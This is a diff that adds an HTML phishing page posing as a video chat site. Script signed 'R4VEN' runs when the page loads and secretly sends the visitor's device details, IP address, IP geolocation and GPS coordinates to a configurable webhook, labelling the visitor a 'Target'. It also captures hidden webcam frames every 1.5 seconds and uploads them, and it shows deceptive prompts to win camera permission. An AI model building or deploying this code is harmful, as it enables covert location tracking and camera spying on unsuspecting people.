@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <script type="text/javascript" src="dwebhook.js">
+  </script>
+</head>
+
+<body onload="getLocation()">
+
+  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
+  </iframe>
+
+  <p id="demo"></p>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+  </script>
+  <script>
+    var x = document.getElementById("demo");
+
+    let datetime = new Date();
+    let localtime = String(datetime.toLocaleTimeString());
+
+
+    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
+
+    const request = new XMLHttpRequest();
+    request.open("POST", "/location_update"); //change webhook
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    var myEmbed = {
+      author: {
+        name: "Target System Information.."
+      },
+      title: "Uagent:",
+      description: sysinfo,
+      color: 15418782
+    }
+
+    var params = {
+      username: "R4VEN",
+      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+      content: "@everyone Someone Opened The Link O_o ",
+      embeds: [myEmbed]
+    }
+
+    request.send(JSON.stringify(params));
+
+    //...
+
+    $.getJSON("https://api.ipify.org?format=json", function (data) {
+      $("#gfg").html(data.ip);
+
+      const request = new XMLHttpRequest();
+      request.open("POST", "/location_update"); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var myEmbed = {
+        author: {
+          name: "Target Ip"
+        },
+        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n",
+        color: 15548997,
+
+        footer: {
+          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
+        }
+      }
+
+      var params = {
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        embeds: [myEmbed]
+      }
+
+      request.send(JSON.stringify(params));
+    })
+
+    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
+
+      const request = new XMLHttpRequest();
+      request.open("POST", "/location_update"); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var myEmbed = {
+        author: {
+          name: "IP Address Reconnaissance"
+        },
+        title: response.status, //response.query
+        description: '```autohotkey\nContinent: ' + response.continent +
+          "\nContinentCode: " + response.continentcode +
+          "\nCountry: " + response.country +
+          "\nCountrycode: " + response.countrycode +
+          "\nRegionname: " + response.regionName +
+          "\nRegion: " + response.region +
+          "\nCity: " + response.city +
+          "\nDistrict: " + response.district +
+          "\nZip: " + response.zip +
+          "\nTime_zone: " + response.time_zone +
+          "\nName: " + response.name +
+          "\nAs: " + response.as +
+          "\nIsp: " + response.isp +
+          "\nReverse: " + response.reverse +
+          "\nOffset: " + response.offset +
+          "\nCurrency: " + response.currency +
+          "\nProxy: " + response.proxy +
+          "\nMobile: " + response.mobile +
+          "\nLat: " + response.lat +
+          "\nLon: " + response.lon + '```',
+        color: 5763719
+
+      }
+
+      var params = {
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        embeds: [myEmbed]
+      }
+
+      request.send(JSON.stringify(params));
+    })
+
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+      } else {
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
+
+    function showPosition(position) {
+      var latlong = (" GET ", "```prolog\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude);
+
+      const request = new XMLHttpRequest();
+      request.open("POST", "/location_update"); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var myEmbed = {
+        author: {
+          name: "Target Allowed Location Permission"
+        },
+        title: "GPS location of target..",
+        description: latlong + "\n",
+        color: 15844367,
+        footer: {
+          text: "GPS fetch almost exact location because it uses longitude and latitude coordinates."
+        }
+      }
+
+      var params = {
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        embeds: [myEmbed]
+      }
+
+      request.send(JSON.stringify(params));
+
+    }
+
+    function showError(error) {
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          const request = new XMLHttpRequest();
+          request.open("POST", "/location_update"); //change webhook
+
+          request.setRequestHeader('Content-type', 'application/json');
+
+          const params = {
+            username: "R4VEN",
+            avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+            content: "```diff\n- User denied the request for Geolocation.```"
+          }
+
+          request.send(JSON.stringify(params));
+          break;
+        case error.POSITION_UNAVAILABLE:
+          x.innerHTML = "Location information is unavailable."
+          break;
+        case error.TIMEOUT:
+          x.innerHTML = "The request to get user location timed out."
+          break;
+        case error.UNKNOWN_ERROR:
+          x.innerHTML = "An unknown error occurred."
+          break;
+      }
+    }
+  </script>
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+  <script>
+    var url = "";
+    request.open("GET", "/get_target", true);
+
+    request.onload = function () {
+      if (request.status === 200) {
+        url = request.responseText;
+      } else {
+        url = "http://127.0.0.1:8000/image"
+      }
+    };
+
+    request.send();
+    function postFile(file) {
+      let formdata = new FormData();
+      formdata.append("image", file);
+      let xhr = new XMLHttpRequest();
+      xhr.open('POST', url, true);
+      xhr.onload = function () {
+        if (this.status === 200)
+          console.log(this.response);
+        else
+          console.error(xhr);
+      };
+      xhr.send(formdata);
+    }
+
+
+
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+
+    const constraints = {
+      audio: false,
+      video: {
+
+        facingMode: "user"
+      }
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints)
+        handleSuccess(stream);
+      } catch (e) {
+        setTimeout(function () {
+          alert("Allow Camera access to video chat");
+          window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623"
+          alert("Grant cam access")
+        }, 15000)
+      }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+      var context = canvas.getContext('2d');
+      setInterval(function () {
+
+        context.drawImage(video, 0, 0, 640, 480);
+        canvas.toBlob(postFile, 'image/jpeg');
+      }, 1500);
+
+
+    }
+
+    // Load init
+    init();
+  </script>
+</body>
+
+</html>
